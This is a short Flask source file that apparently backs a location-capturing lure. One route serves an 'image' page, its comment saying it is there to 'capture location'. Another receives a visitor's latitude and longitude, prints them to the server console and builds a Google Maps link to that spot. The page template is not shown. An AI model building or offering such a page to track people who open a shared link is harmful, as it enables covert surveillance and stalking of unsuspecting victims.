from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

# Route to serve the image and capture location
@app.route('/image')
def serve_image():
    return render_template('image.html')

# Route to handle location data sent by the user
@app.route('/capture_location', methods=['POST'])
def capture_location():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    
    if latitude and longitude:
        # Print the user's location
        print(f"User Location: Latitude = {latitude}, Longitude = {longitude}")
        
        # Generate Google Maps link
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        print(f"Google Maps Link: {google_maps_link}")
        
        return jsonify({"status": "success", "google_maps_link": google_maps_link})
    else:
        return jsonify({"status": "error", "message": "Invalid location data"}), 400

if __name__ == '__main__':
    app.run(debug=True)